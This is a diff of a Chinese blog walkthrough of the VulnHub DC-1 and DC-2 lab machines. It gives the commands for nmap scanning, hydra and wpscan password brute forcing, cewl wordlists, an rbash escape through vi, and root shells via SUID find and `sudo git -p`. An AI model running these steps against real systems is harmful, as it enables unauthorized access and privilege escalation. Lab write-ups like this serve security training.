@@ -998,10 +998,10 @@ handler 指向RequestHandler
 <figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nmap</span> -sP  <span class="number">192.168.133.134</span>/<span class="number">24</span> //<span class="number">192.168.133.134</span>是虚拟机ip</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2022/08/29/vulnhub/image-20220829154027029.png" alt="image-20220829154027029"></p>
-<p>找到靶机ip</p>
+<p>找到靶机<code>ip</code></p>
 <figure class="highlight accesslog"><table><tr><td class="code"><pre><span class="line"><span class="number">192.168.133.136</span></span><br></pre></td></tr></table></figure>
 
-<p>习惯性用nmap扫一下它端口</p>
+<p>习惯性用<code>nmap</code>扫一下它端口</p>
 <p><img src="/2022/08/29/vulnhub/image-20220829154322453.png" alt="image-20220829154322453"></p>
 <hr>
 <h1 id="DC系列【1-9】-完"><a href="#DC系列【1-9】-完" class="headerlink" title="DC系列【1~9】(完)"></a>DC系列【1~9】(完)</h1><h1 id="一、DC-1-初级"><a href="#一、DC-1-初级" class="headerlink" title="一、DC-1[初级]"></a>一、DC-1[初级]</h1><p><strong>five flags</strong></p>
@@ -1160,34 +1160,34 @@ handler 指向RequestHandler
 <p>发现有个flag4.txt，查看</p>
 <p><img src="/2022/08/29/vulnhub/image-20220830163358828.png" alt="image-20220830163358828"></p>
 <p>得到flag4</p>
-<h3 id="2）官方方法"><a href="#2）官方方法" class="headerlink" title="2）官方方法"></a>2）官方方法</h3><p>用了hydra[九头蛇]工具，对我们在passwd里看到flag4用户进行爆破</p>
+<h3 id="2）官方方法"><a href="#2）官方方法" class="headerlink" title="2）官方方法"></a>2）官方方法</h3><p>用了<code>hydra</code>[九头蛇]工具，对我们在<code>passwd</code>里看到<code>flag4</code>用户进行爆破</p>
 <figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">hydra -l flag4 -p <span class="regexp">/usr/</span>share<span class="regexp">/wordlists/</span>rockyou.txt.gz <span class="number">192.168</span>.<span class="number">133.136</span> -vV -f</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-l是指定用户或指定包含多个用户的文件，-p是指定密码或指定包含多个密码的文件，ssh就是</span><br><span class="line">用户所在的网站</span><br><span class="line"></span><br><span class="line">上面-p的文件是自己下载的密码包</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2022/08/29/vulnhub/image-20220830211739164.png" alt="image-20220830211739164"></p>
-<p>这里就看到flag4用户的密码被爆破出来，是orange</p>
-<p>然后用ssh连接</p>
+<p>这里就看到<code>flag4</code>用户的密码被爆破出来，是<code>orange</code></p>
+<p>然后用<code>ssh</code>连接</p>
 <figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">输入ssh <span class="symbol">flag4@</span><span class="number">192.168</span><span class="number">.133</span><span class="number">.136</span></span><br><span class="line">然后yes</span><br><span class="line">然后输入密码：orange</span><br></pre></td></tr></table></figure>
 
-<p>进入flag4用户页面，</p>
+<p>进入<code>flag4</code>用户页面，</p>
 <figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line">输入cat fla<span class="name">g4.</span>txt</span><br><span class="line">得到fla<span class="name">g4</span></span><br></pre></td></tr></table></figure>
 
 <p><img src="/2022/08/29/vulnhub/image-20220830211817515.png" alt="image-20220830211817515"></p>
 <hr>
 <h2 id="Flag5"><a href="#Flag5" class="headerlink" title="Flag5"></a>Flag5</h2><figure class="highlight oxygene"><table><tr><td class="code"><pre><span class="line">分析一下flag5</span><br><span class="line">Can you use this same <span class="keyword">method</span> <span class="title function_">to</span> <span class="title function_">find</span> <span class="title function_">or</span> <span class="title function_">access</span> <span class="title function_">the</span> <span class="title function_">flag</span> <span class="title function_">in</span> <span class="title function_">root</span>?</span><br><span class="line"></span><br><span class="line"><span class="title function_">Probably</span>. <span class="title function_">But</span> <span class="title function_">perhaps</span> <span class="title function_">it</span>&#x27;<span class="title function_">s</span> <span class="title function_">not</span> <span class="title function_">that</span> <span class="title function_">easy</span>.  <span class="title function_">Or</span> <span class="title function_">maybe</span> <span class="title function_">it</span> <span class="title function_">is</span>?</span><br><span class="line"></span><br><span class="line">意思是：您可以使用相同的方法查找或访问根目录中的标志吗？</span><br><span class="line"></span><br><span class="line">可能但也许这并不容易。也许是这样？</span><br></pre></td></tr></table></figure>
 
-<p>root应该就是需要提权了</p>
-<h3 id="suid提权"><a href="#suid提权" class="headerlink" title="suid提权"></a>suid提权</h3><p>linux提权操作可以看一下我的<code>WEB随笔</code>里<code>suid</code>提权，下面只记录流程</p>
+<p><code>root</code>应该就是需要提权了</p>
+<h3 id="suid提权"><a href="#suid提权" class="headerlink" title="suid提权"></a>suid提权</h3><p><code>linux</code>提权操作可以看一下我的<code>WEB随笔</code>里<code>suid</code>提权，下面只记录流程</p>
 <figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">输入<span class="built_in">find</span> / -perm <span class="attribute">-u</span>=s -type f 2&gt;/dev/<span class="literal">null</span>，查看目录下suid权限所有可执行二进制文件</span><br></pre></td></tr></table></figure>
 
 <p>发现<code>find</code>目录</p>
 <p><img src="/2022/08/29/vulnhub/image-20220830162407934.png" alt="image-20220830162407934"></p>
-<p>于是可以利用find获取root权限shell</p>
-<p>主要是要让find命令成功执行，找一个存在的文件即可</p>
+<p>于是可以利用<code>find</code>获取<code>root</code>权限<code>shell</code></p>
+<p>主要是要让<code>find</code>命令成功执行，找一个存在的文件即可</p>
 <figure class="highlight sqf"><table><tr><td class="code"><pre><span class="line">以在根目录为例</span><br><span class="line">输入<span class="built_in">find</span> / -<span class="built_in">name</span> initrd.img -<span class="built_in">exec</span> <span class="string">&quot;/bin/sh&quot;</span> \;</span><br></pre></td></tr></table></figure>
 
 <p>提权成功</p>
 <p><img src="/2022/08/29/vulnhub/image-20220830164525214.png" alt="image-20220830164525214"></p>
-<p>我们在flag4里知道，最后的旗子在root目录里</p>
+<p>我们在<code>flag4</code>里知道，最后的旗子在<code>root</code>目录里</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">输入<span class="built_in">cd</span> /root;<span class="built_in">ls</span> -a</span><br></pre></td></tr></table></figure>
 
 <p>发现<code>thefinalflag.txt</code></p>
@@ -1205,18 +1205,18 @@ handler 指向RequestHandler
 <figure class="highlight css"><table><tr><td class="code"><pre><span class="line">输入nmap -<span class="selector-tag">p</span>- <span class="number">192.168</span>.<span class="number">133.138</span> -<span class="selector-tag">A</span></span><br></pre></td></tr></table></figure>
 
 <p><img src="/2022/08/29/vulnhub/image-20220831205550715.png" alt="image-20220831205550715"></p>
-<p>发现7744端口运行的ssh，22端口被换了</p>
+<p>发现<code>7744</code>端口运行的<code>ssh</code>，<code>22</code>端口被换了</p>
 <figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Ssh</span>是一个安全的远程登录协议,它的端口号默认是<span class="number">22</span>端口</span><br></pre></td></tr></table></figure>
 
 
 
 <figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line">SSH 为 Secure <span class="keyword">Shell </span>的缩写，由 IETF 的网络小组（Network Working Group）所制定；SSH 为建立在应用层基础上的安全协议。SSH 是较可靠，专为远程登录会话和其他网络服务提供安全性的协议。利用 SSH 协议可以有效防止远程管理过程中的信息泄露问题。SSH最初是UNIX系统上的一个程序，后来又迅速扩展到其他操作平台。SSH在正确使用时可弥补网络中的漏洞。SSH客户端适用于多种平台。几乎所有UNIX平台—包括HP-UX、Linux、AIX、Solaris、<span class="keyword">Digital </span>UNIX、Irix，以及其他平台，都可运行SSH。</span><br></pre></td></tr></table></figure>
 
-<p>我们试试访问我们的靶机ip：<code>192.168.133.138</code></p>
+<p>我们试试访问我们的靶机<code>ip</code>：<code>192.168.133.138</code></p>
 <hr>
 <p>但是访问失败【如果没有问题，可以忽略】</p>
 <p><img src="/2022/08/29/vulnhub/image-20220831210742250.png" alt="image-20220831210742250"></p>
-<p>可以看到，访问IP的时候进行了一个跳转，跳转到了<code>http://dc-2</code>，且无法访问</p>
+<p>可以看到，访问<code>IP</code>的时候进行了一个跳转，跳转到了<code>http://dc-2</code>，且无法访问</p>
 <p>我猜测是<code>hosts</code>文件没有修改，所以域名无法登录</p>
 <p>需要在<code>hosts</code>其中添加域名：<code>http://dc-2</code>和其ip：<code>192.168.133.138</code>，<code>dns</code>才能正常转换</p>
 <figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">输入vi <span class="regexp">/etc/</span>hosts</span><br></pre></td></tr></table></figure>
@@ -1230,14 +1230,14 @@ handler 指向RequestHandler
 <p><img src="/2022/08/29/vulnhub/image-20220831212746196.png" alt="image-20220831212746196"></p>
 <p>成功连接</p>
 <hr>
-<h2 id="Flag1-1"><a href="#Flag1-1" class="headerlink" title="Flag1"></a>Flag1</h2><p>进入网页就看到flag了</p>
+<h2 id="Flag1-1"><a href="#Flag1-1" class="headerlink" title="Flag1"></a>Flag1</h2><p>进入网页就看到<code>flag</code>了</p>
 <p><img src="/2022/08/29/vulnhub/image-20220831212936534.png" alt="image-20220831212936534"></p>
 <p>点击打开查看</p>
 <p><img src="/2022/08/29/vulnhub/image-20220831213114724.png" alt="image-20220831213114724"></p>
-<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">	</span><br><span class="line"></span><br><span class="line">Flag <span class="number">1</span>:</span><br><span class="line"></span><br><span class="line">Your usual wordlists probably won’t <span class="keyword">work</span>, so <span class="keyword">instead</span>, maybe you just need <span class="keyword">to</span> be cewl.</span><br><span class="line"></span><br><span class="line">More passwords <span class="keyword">is</span> <span class="keyword">always</span> better, but sometimes you just can’t win them <span class="keyword">all</span>.</span><br><span class="line"></span><br><span class="line"><span class="keyword">Log</span> <span class="keyword">in</span> <span class="keyword">as</span> one <span class="keyword">to</span> see the next flag.</span><br><span class="line"></span><br><span class="line"><span class="keyword">If</span> you can’t find it, <span class="keyword">log</span> <span class="keyword">in</span> <span class="keyword">as</span> another.</span><br><span class="line"></span><br><span class="line">意思是：</span><br><span class="line">你通常的密码表可能不起作用，因此，也许你只需要成为cewl。</span><br><span class="line"></span><br><span class="line">密码越多越好，但有时你无法赢得所有密码。</span><br><span class="line"></span><br><span class="line">作为一个登录以查看下一个标志。</span><br><span class="line"></span><br><span class="line">如果找不到，请作为另一个登录。</span><br><span class="line"><span class="comment">--</span></span><br><span class="line"></span><br><span class="line">·Cewl是一个通过指定url及深度,使用爬虫技术,生成字典的一个工具。</span><br><span class="line"></span><br><span class="line">那我们就用cewl工具试一下</span><br><span class="line">*不会工具一般用-h就可以知道使用说明</span><br></pre></td></tr></table></figure>
+<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">Flag <span class="number">1</span>:</span><br><span class="line"></span><br><span class="line">Your usual wordlists probably won’t <span class="keyword">work</span>, so <span class="keyword">instead</span>, maybe you just need <span class="keyword">to</span> be cewl.</span><br><span class="line"></span><br><span class="line">More passwords <span class="keyword">is</span> <span class="keyword">always</span> better, but sometimes you just can’t win them <span class="keyword">all</span>.</span><br><span class="line"></span><br><span class="line"><span class="keyword">Log</span> <span class="keyword">in</span> <span class="keyword">as</span> one <span class="keyword">to</span> see the next flag.</span><br><span class="line"></span><br><span class="line"><span class="keyword">If</span> you can’t find it, <span class="keyword">log</span> <span class="keyword">in</span> <span class="keyword">as</span> another.</span><br><span class="line"></span><br><span class="line">意思是：</span><br><span class="line">你通常的密码表可能不起作用，因此，也许你只需要成为cewl。</span><br><span class="line"></span><br><span class="line">密码越多越好，但有时你无法赢得所有密码。</span><br><span class="line"></span><br><span class="line">作为一个登录以查看下一个标志。</span><br><span class="line"></span><br><span class="line">如果找不到，请作为另一个登录。</span><br><span class="line"><span class="comment">--</span></span><br><span class="line"></span><br><span class="line">·Cewl是一个通过指定url及深度,使用爬虫技术,生成字典的一个工具。</span><br><span class="line"></span><br><span class="line">那我们就用cewl工具试一下</span><br><span class="line">*不会工具一般用-h就可以知道使用说明</span><br></pre></td></tr></table></figure>
 
 <hr>
-<h2 id="Flag2-1"><a href="#Flag2-1" class="headerlink" title="Flag2"></a>Flag2</h2><p>根据flag1，我们用<code>cewl</code>试试生成字典</p>
+<h2 id="Flag2-1"><a href="#Flag2-1" class="headerlink" title="Flag2"></a>Flag2</h2><p>根据<code>flag1</code>，我们用<code>cewl</code>试试生成字典</p>
 <h3 id="cewl"><a href="#cewl" class="headerlink" title="cewl"></a>cewl</h3><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">输入cewl http:<span class="regexp">//</span>dc-<span class="number">2</span>/ &gt;pass.txt</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2022/08/29/vulnhub/image-20220831221031390.png" alt="image-20220831221031390"></p>
@@ -1246,10 +1246,10 @@ handler 指向RequestHandler
 
 <p><img src="/2022/08/29/vulnhub/image-20220831221151099.png" alt="image-20220831221151099"></p>
 <p>发现是生成对应网站的密码字典</p>
-<p>flag1整理信息好像差不多了，下面我们利用dc1提到的<code>wappalyzer</code>，查看一下网页的框架结构有没有什么线索</p>
+<p><code>flag1</code>整理信息好像差不多了，下面我们利用<code>dc1</code>提到的<code>wappalyzer</code>，查看一下网页的框架结构有没有什么线索</p>
 <p><img src="/2022/08/29/vulnhub/image-20220831221945690.png" alt="image-20220831221945690"></p>
 <p>发现网站的<code>CMS</code>是<code>WordPress</code>，还可以看到它的主题是<code>Twenty Seventeen</code></p>
-<p>那wordpress，有没有什么漏洞可以供我们利用呢，下面就提及另一个工具</p>
+<p>那<code>wordpress</code>，有没有什么漏洞可以供我们利用呢，下面就提及另一个工具</p>
 <h3 id="wpscan"><a href="#wpscan" class="headerlink" title="wpscan"></a>wpscan</h3><p><code>WPScan是Kali Linux默认自带的一款漏洞扫描工具,它采用Ruby编写 能够扫描WordPress网站中的多种安全漏洞,其中包括主题漏洞、插件漏洞和WordPress本身的漏洞</code></p>
 <p>于是我们就可以针对性对wordpress进行渗透看看，可不可以利用一下</p>
 <figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">输入wpscan --url http:<span class="regexp">//</span>dc-<span class="number">2</span> -e u</span><br></pre></td></tr></table></figure>
@@ -1261,7 +1261,7 @@ handler 指向RequestHandler
 <figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line">输入vi un.txt,把admin <span class="keyword">jerry </span>tom复制进去</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2022/08/29/vulnhub/image-20220831223714569.png" alt="image-20220831223714569"></p>
-<p>然后就可以结合我们的密码文本和用户名文本，利用wpscan这个工具，进行爆破操作了</p>
+<p>然后就可以结合我们的密码文本和用户名文本，利用<code>wpscan</code>这个工具，进行爆破操作了</p>
 <figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">输入wpscan --url http:<span class="regexp">//</span>dc-<span class="number">2</span> -P pass.txt -U un.txt</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2022/08/29/vulnhub/image-20220831223950721.png" alt="image-20220831223950721"></p>
@@ -1276,19 +1276,19 @@ handler 指向RequestHandler
 <p><img src="/2022/08/29/vulnhub/image-20220831224833915.png" alt="image-20220831224833915"></p>
 <p>用我们之前获得的用户名和密码登录试试</p>
 <p>以<code>jerry</code>为例，好像用<code>tom</code>会显示密码错误</p>
-<p>在page窗口发现flag2</p>
+<p>在<code>page</code>窗口发现<code>flag2</code></p>
 <p><img src="/2022/08/29/vulnhub/image-20220831225233262.png" alt="image-20220831225233262"></p>
 <p>点开查看，得到flag2</p>
 <p><img src="/2022/08/29/vulnhub/image-20220831225256842.png" alt="image-20220831225256842"></p>
 <figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">Flag <span class="number">2</span>:</span><br><span class="line"></span><br><span class="line"><span class="keyword">If</span> you can<span class="symbol">&#x27;t</span> exploit WordPress <span class="keyword">and</span> take a shortcut, there <span class="keyword">is</span> another way.</span><br><span class="line"></span><br><span class="line">Hope you found another <span class="keyword">entry</span> point.</span><br><span class="line">意思是：</span><br><span class="line">如果你不能利用WordPress并走捷径，还有另一种方法。</span><br><span class="line"></span><br><span class="line">希望你能找到另一个切入点。 </span><br></pre></td></tr></table></figure>
 
 <hr>
-<h2 id="Flag3-1"><a href="#Flag3-1" class="headerlink" title="Flag3"></a>Flag3</h2><p>根据flag2的提示，实际上就是说从wordpress这条路是行不通的，要从另外的方向</p>
-<p>但是如果wordpress行不通，而这个网站就是wordpress搭建起来的，那么这个网站的就不能下手</p>
-<p>虽然网站的80端口的http行不通</p>
-<p>但是我们之前用nmap扫了一下，发现端口7744运行着ssh，那我们能不能利用ssh登录成功呢</p>
+<h2 id="Flag3-1"><a href="#Flag3-1" class="headerlink" title="Flag3"></a>Flag3</h2><p>根据<code>flag2</code>的提示，实际上就是说从<code>wordpress</code>这条路是行不通的，要从另外的方向</p>
+<p>但是如果<code>wordpress</code>行不通，而这个网站就是<code>wordpress</code>搭建起来的，那么这个网站的就不能下手</p>
+<p>虽然网站的<code>80</code>端口的<code>http</code>行不通</p>
+<p>但是我们之前用<code>nmap</code>扫了一下，发现端口<code>7744</code>运行着<code>ssh</code>，那我们能不能利用<code>ssh</code>登录成功呢</p>
 <p><img src="/2022/08/29/vulnhub/image-20220831205550715.png" alt="image-20220831205550715"></p>
-<p>我们先用之前用过的工具<code>hydra</code>进行爆破一下，看看这个ssh的用户是谁</p>
+<p>我们先用之前用过的工具<code>hydra</code>进行爆破一下，看看这个<code>ssh</code>的用户是谁</p>
 <figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">输入hydra -l un<span class="selector-class">.txt</span> -P pass<span class="selector-class">.txt</span> <span class="number">192.168</span>.<span class="number">133.138</span> ssh -s <span class="number">7744</span></span><br></pre></td></tr></table></figure>
 
 <p><img src="/2022/08/29/vulnhub/image-20220831230552544.png" alt="image-20220831230552544"></p>
@@ -1302,18 +1302,18 @@ handler 指向RequestHandler
 
 <p><img src="/2022/08/29/vulnhub/image-20220831231634426.png" alt="image-20220831231634426"></p>
 <p>发现没有该命令，那就可能是没有权限执行这个命令了</p>
-<h3 id="rbash"><a href="#rbash" class="headerlink" title="rbash"></a>rbash</h3><p>看到rbash，不认识，查一下</p>
+<h3 id="rbash"><a href="#rbash" class="headerlink" title="rbash"></a>rbash</h3><p>看到<code>rbash</code>，不认识，查一下</p>
 <figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">rbash</span><br><span class="line">它与一般<span class="keyword">shell</span><span class="language-bash">的区别在于会限制一些行为，让一些命令无法执行</span></span><br></pre></td></tr></table></figure>
 
-<p>看来是限制了我们的命令，但我们还是得知道我们目前还能用那些命令，之前使用过ls，所以ls可以使用</p>
+<p>看来是限制了我们的命令，但我们还是得知道我们目前还能用那些命令，之前使用过<code>ls</code>，所以<code>ls</code>可以使用</p>
 <figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">输入ls <span class="regexp">/home/</span>tom<span class="regexp">/usr/</span>bin   <span class="regexp">//</span>查看rbash设置的可执行的命令</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2022/08/29/vulnhub/image-20220831232504736.png" alt="image-20220831232504736"></p>
 <p>我们可以看到我们可以利用</p>
 <figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">less <span class="keyword">ls</span> scp <span class="keyword">vi</span></span><br></pre></td></tr></table></figure>
 
-<p>关键是vi的命令</p>
-<h3 id="vi绕过-gt-rbash逃逸"><a href="#vi绕过-gt-rbash逃逸" class="headerlink" title="*vi绕过-&gt;rbash逃逸"></a>*vi绕过-&gt;rbash逃逸</h3><p>可以进入vi中，执行<code>set</code>命令，把<code>shell</code>改为<code>/bin/sh</code></p>
+<p>关键是<code>vi</code>的命令</p>
+<h3 id="vi绕过-gt-rbash逃逸"><a href="#vi绕过-gt-rbash逃逸" class="headerlink" title="*vi绕过-&gt;rbash逃逸"></a>*vi绕过-&gt;rbash逃逸</h3><p>可以进入<code>vi</code>中，执行<code>set</code>命令，把<code>shell</code>改为<code>/bin/sh</code></p>
 <figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">先输入<span class="keyword">vi</span>，进入<span class="keyword">vi</span></span><br></pre></td></tr></table></figure>
 
 <p><img src="/2022/08/29/vulnhub/image-20220831233127692.png" alt="image-20220831233127692"></p>
@@ -1322,31 +1322,31 @@ handler 指向RequestHandler
 
 <p><img src="/2022/08/29/vulnhub/image-20220831233626801.png" alt="image-20220831233626801"></p>
 <p>这样我们就完成了逃逸</p>
-<p>之前因为我们受限于rbash，不能执行cd等命令</p>
+<p>之前因为我们受限于<code>rbash</code>，不能执行<code>cd</code>等命令</p>
 <p><img src="/2022/08/29/vulnhub/image-20220831233814113.png" alt="image-20220831233814113"></p>
 <p>现在执行试试</p>
 <p><img src="/2022/08/29/vulnhub/image-20220831234028674.png" alt="image-20220831234028674"></p>
 <p>就没有阻止了</p>
-<p>我们再试试cat</p>
+<p>我们再试试<code>cat</code></p>
 <p><img src="/2022/08/29/vulnhub/image-20220831234235801.png" alt="image-20220831234235801"></p>
-<p>发现cat命令找不到，但是我们已经绕过了rbash，所以只能是其他原因</p>
+<p>发现<code>cat</code>命令找不到，但是我们已经绕过了<code>rbash</code>，所以只能是其他原因</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">输入<span class="built_in">echo</span> <span class="variable">$PATH</span></span><br><span class="line">这是显示当前环境变量，可能<span class="built_in">cat</span>并没有被设置到当前的环境变量所以无法执行</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2022/08/29/vulnhub/image-20220831234423827.png" alt="image-20220831234423827"></p>
 <h3 id="设置全局变量"><a href="#设置全局变量" class="headerlink" title="*设置全局变量"></a>*设置全局变量</h3><figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">于是我们来设置全局变量,终端输入</span><br><span class="line">export <span class="variable constant_">PATH</span>=<span class="variable constant_">PATH</span><span class="symbol">:/usr/local/sbin</span><span class="symbol">:/usr/local/bin</span><span class="symbol">:usr/sbin</span><span class="symbol">:/usr/bin</span><span class="symbol">:/bin</span><span class="symbol">:sbin</span></span><br></pre></td></tr></table></figure>
 
-<p>这样我们执行cat就不会只在<code>/home/tom/usr/bin</code>里面寻找了，会在很多目录里寻找</p>
+<p>这样我们执行<code>cat</code>就不会只在<code>/home/tom/usr/bin</code>里面寻找了，会在很多目录里寻找</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">输入<span class="built_in">cd</span> tom</span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line"><span class="built_in">cat</span> flag3.txt</span><br><span class="line">得到flag3</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2022/08/29/vulnhub/image-20220831235038373.png" alt="image-20220831235038373"></p>
 <figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line">Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.</span><br><span class="line">意思是：</span><br><span class="line"><span class="section">可怜的老汤姆总是在追杰瑞。也许他应该为他造成的所有压力负责。</span></span><br><span class="line"><span class="section">--</span></span><br><span class="line">但是看到了su，也就是需要切换用户</span><br></pre></td></tr></table></figure>
 
 <hr>
-<h2 id="Flag4-1"><a href="#Flag4-1" class="headerlink" title="Flag4"></a>Flag4</h2><p>根据flag3，我们可以知道需要用su命令切换用户到jerry</p>
+<h2 id="Flag4-1"><a href="#Flag4-1" class="headerlink" title="Flag4"></a>Flag4</h2><p>根据<code>flag3</code>，我们可以知道需要用<code>su</code>命令切换用户到<code>jerry</code></p>
 <figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">输入<span class="keyword">su</span> jerry和其密码</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2022/08/29/vulnhub/image-20220901094337288.png" alt="image-20220901094337288"></p>
-<p>然后切换到jerry目录，发现flag4.txt</p>
+<p>然后切换到<code>jerry</code>目录，发现<code>flag4.txt</code></p>
 <p><img src="/2022/08/29/vulnhub/image-20220901094512382.png" alt="image-20220901094512382"></p>
 <figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">Good <span class="keyword">to</span> see <span class="keyword">that</span> you&#x27;ve made <span class="keyword">it</span> this far - <span class="keyword">but</span> you&#x27;re <span class="keyword">not</span> home yet. </span><br><span class="line"></span><br><span class="line">You still need <span class="keyword">to</span> <span class="keyword">get</span> <span class="keyword">the</span> final flag (<span class="keyword">the</span> only flag <span class="keyword">that</span> really counts!!!).  </span><br><span class="line"></span><br><span class="line">No hints here - you&#x27;re <span class="keyword">on</span> your own now.  :-)</span><br><span class="line"></span><br><span class="line">Go <span class="keyword">on</span> - git outta here!!!!</span><br><span class="line">意思是：</span><br><span class="line">很高兴看到你走了这么远，但你还没回家。</span><br><span class="line">你仍然需要得到最后的标志（唯一真正重要的标志！！！）。</span><br><span class="line">这里没有提示-你现在只能靠自己了。：-）</span><br><span class="line">去吧-滚出去！！！！</span><br><span class="line"><span class="comment">--</span></span><br><span class="line">看到git，就是提示我们用git命令</span><br></pre></td></tr></table></figure>
 
@@ -1354,46 +1354,44 @@ handler 指向RequestHandler
 <h2 id="Flag5-1"><a href="#Flag5-1" class="headerlink" title="Flag5"></a>Flag5</h2><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">输入sudo -l</span><br><span class="line"><span class="regexp">//</span>列出目前用户可执行与无法执行的指令。</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2022/08/29/vulnhub/image-20220901112624228.png" alt="image-20220901112624228"></p>
-<p><u>就可以发现root以nopasswd【不需要密码】运行git命令</u></p>
-<p>原理是git存在缓存区溢出漏洞，</p>
+<p><u>就可以发现root以<code>nopasswd</code>【不需要密码】运行<code>git</code>命令</u></p>
+<p>原理是<code>git</code>存在缓存区溢出漏洞，</p>
 <p>在使用</p>
 <figure class="highlight css"><table><tr><td class="code"><pre><span class="line">sudo git -<span class="selector-tag">p</span></span><br></pre></td></tr></table></figure>
 
-<p>不需要输入root密码，即可以root身份执行这条命令</p>
+<p>不需要输入<code>root</code>密码，即可以<code>root</code>身份执行这条命令</p>
 <p>操作如下</p>
 <figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">sudo git -p     </span><br><span class="line"><span class="regexp">//</span>-p是分页查看，这个原理就是终端的窗口大小不够显示，所以下方会出现冒号，等待输入命令</span><br></pre></td></tr></table></figure>
 
 <p>下面可以看看区别</p>
-<h3 id="注意"><a href="#注意" class="headerlink" title="*注意"></a>*注意</h3><p>1.窗口足够大</p>
-<p><img src="/2022/08/29/vulnhub/image-20220901113721300.png" alt="image-20220901113721300"></p>
-<p>可以看到显示完了，就又回到原处了</p>
-<p>2.窗口小一些</p>
-<p><img src="/2022/08/29/vulnhub/image-20220901113851826.png" alt="image-20220901113851826"></p>
+<h3 id="注意窗口大小"><a href="#注意窗口大小" class="headerlink" title="*注意窗口大小"></a>*注意窗口大小</h3><h4 id="1-窗口足够大"><a href="#1-窗口足够大" class="headerlink" title="1.窗口足够大"></a>1.窗口足够大</h4><p><img src="/2022/08/29/vulnhub/image-20220901113721300.png" alt="image-20220901113721300"></p>
+<p>可以看到显示完了，就又回到原处了【不行】</p>
+<h4 id="2-窗口小一些"><a href="#2-窗口小一些" class="headerlink" title="2.窗口小一些"></a>2.窗口小一些</h4><p><img src="/2022/08/29/vulnhub/image-20220901113851826.png" alt="image-20220901113851826"></p>
 <p>下方就显示出:，等待输入</p>
 <figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line">**:是自带有的，不是输入的</span><br><span class="line">:!/bin/sh    //感叹号!是shell转义字符，所以要避免sudo授权用户使用vi，vim，ftp，lee，more，git</span><br><span class="line">进入root</span><br><span class="line"><span class="section">cd /root</span></span><br><span class="line"><span class="section">--</span></span><br><span class="line">当然也可以执行:!passwd root</span><br><span class="line">修改其密码</span><br><span class="line">然后su root登录也可</span><br></pre></td></tr></table></figure>
 
-<h3 id="1-执行命令，拿到root的shell"><a href="#1-执行命令，拿到root的shell" class="headerlink" title="1.执行命令，拿到root的shell"></a>1.执行命令，拿到root的shell</h3><p>$变成#成功</p>
+<h3 id="1-执行命令，拿到root的shell"><a href="#1-执行命令，拿到root的shell" class="headerlink" title="1.执行命令，拿到root的shell"></a>1.执行命令，拿到root的shell</h3><p><code>$</code>变成<code>#</code>成功</p>
 <p><img src="/2022/08/29/vulnhub/image-20220901114902493.png" alt="image-20220901114902493"></p>
 <h3 id="2-修改密码，登录"><a href="#2-修改密码，登录" class="headerlink" title="2.修改密码，登录"></a>2.修改密码，登录</h3><p><img src="/2022/08/29/vulnhub/image-20220901114453769.png" alt="image-20220901114453769"></p>
-<p>$变成#，成功登录</p>
+<p><code>$</code>变成<code>#</code>，成功登录</p>
 <p><img src="/2022/08/29/vulnhub/image-20220901114726423.png" alt="image-20220901114726423"></p>
-<p>然后到<code>/root</code>目录下，找到最后的 flag</p>
+<p>然后到<code>/root</code>目录下，找到最后的 <code>flag</code></p>
 <p><img src="/2022/08/29/vulnhub/image-20220901115306177.png" alt="image-20220901115306177"></p>
 <figure class="highlight gherkin"><table><tr><td class="code"><pre><span class="line"> __    __     _ _       _                    _ </span><br><span class="line">/ / /\ \ \___|<span class="string"> </span>|<span class="string"> </span>|<span class="string">   __</span>|<span class="string"> </span>|<span class="string"> ___  _ __   ___  / \</span></span><br><span class="line"><span class="string">\ \/  \/ / _ \ </span>|<span class="string"> </span>|<span class="string">  / _` </span>|<span class="string">/ _ \</span>|<span class="string"> &#x27;_ \ / _ \/  /</span></span><br><span class="line"><span class="string"> \  /\  /  __/ </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> (_</span>|<span class="string"> </span>|<span class="string"> (_) </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string">  __/\_/ </span></span><br><span class="line"><span class="string">  \/  \/ \___</span>|<span class="string">_</span>|<span class="string">_</span>|<span class="string">  \__,_</span>|<span class="string">\___/</span>|<span class="string">_</span>|<span class="string"> </span>|<span 